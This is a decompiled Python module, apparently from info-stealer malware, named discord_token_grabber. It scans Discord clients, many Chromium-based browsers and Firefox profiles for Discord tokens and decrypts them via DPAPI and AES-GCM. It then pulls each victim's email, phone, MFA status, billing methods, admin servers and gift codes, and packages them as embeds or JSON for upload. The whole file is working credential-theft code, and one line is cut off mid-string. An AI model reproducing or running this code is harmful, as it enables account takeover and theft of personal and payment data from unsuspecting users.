# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: resources\discord_token_grabber.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from discord import Embed
from win32crypt import CryptUnprotectData

class grab_discord:
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.regexp = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.regexp_enc = 'dQw4w9WgXcQ:[^\\\"]*'
        self.tokens, self.uids = ([], [])
        self.extract()

    def extract(self) -> None:
        paths = {'Discord': self.roaming or '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming or '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming or '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming or '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.roaming or '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.roaming or '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata or '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata or '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata or '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata or '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata or '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata or '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata or '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata or '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': self.appdata or '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': self.appdata or '
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(' ', '').lower()
            if 'cord' in path:
                if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ('log', 'ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
            else:  # inserted
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ('log', 'ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200:
            return True
        return False

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens

    def upload(self, raw_data):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            if user['premium_type'] == 0:
                nitro = 'None'
            else:  # inserted
                if user['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                else:  # inserted
                    if user['premium_type'] == 2:
                        nitro = 'Nitro'
                    else:  # inserted
                        if user['premium_type'] == 3:
                            nitro = 'Nitro Basic'
                        else:  # inserted
                            nitro = 'None'
            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    else:  # inserted
                        if method['type'] == 2:
                            payment_methods.append('PayPal')
                        else:  # inserted
                            payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else:  # inserted
                payment_methods = None
            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = int(guild['permissions'])!= 8!= 0
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = '✅' if guild['owner'] else '❌'
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0:
                            invite = f'https://discord.gg/' + invites[0]['code']
                        else:  # inserted
                            invite = 'https://youtu.be/dQw4w9WgXcQ'
                        data = f"​\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] + guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        if len('\n'.join(hq_guilds)) - len(data) >= 1024:
                            break
                        hq_guilds.append(data)
                if len(hq_guilds) > 0:
                    hq_guilds = '\n'.join(hq_guilds)
                else:  # inserted
                    hq_guilds = None
            else:  # inserted
                hq_guilds = None
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']
                    data = f':gift: `{name}`\n:ticket: `{code}`'
                    if len('\n\n'.join(codes)) - len(data) >= 1024:
                        break
                    codes.append(data)
                if len(codes) > 0:
                    codes = '\n\n'.join(codes)
                else:  # inserted
                    codes = None
            else:  # inserted
                codes = None
            if not raw_data:
                embed = Embed(title=f'{username} ({user_id})', color=34047)
                embed.set_thumbnail(url=avatar)
                embed.add_field(name='​\n📜 Token:', value=f'```{token}```\n​', inline=False)
                embed.add_field(name='💎 Nitro:', value=f'{nitro}', inline=False)
                embed.add_field(name='💳 Billing:', value=f"{(payment_methods if payment_methods!= '' else 'None')}", inline=False)
                embed.add_field(name='🔒 MFA:', value=f'{mfa}\n​', inline=False)
                embed.add_field(name='📧 Email:', value=f"{(email if email!= None else 'None')}", inline=False)
                embed.add_field(name='📳 Phone:', value=f"{(phone if phone!= None else 'None')}\n​", inline=False)
                if hq_guilds!= None:
                    embed.add_field(name='🏰 HQ Guilds:', value=hq_guilds, inline=False)
                if codes!= None:
                    embed.add_field(name='​\n🎁 Gift Codes:', value=codes, inline=False)
                final_to_return.append(embed)
            else:  # inserted
                final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': payment_methods if payment_methods!= '' else 'None', 'mfa': mfa, 'email': email if email!= None else 'None', 'phone': phone if phone!= None else 'None', 'hq_guilds': hq_guilds, 'gift_codes': codes}))
        return final_to_return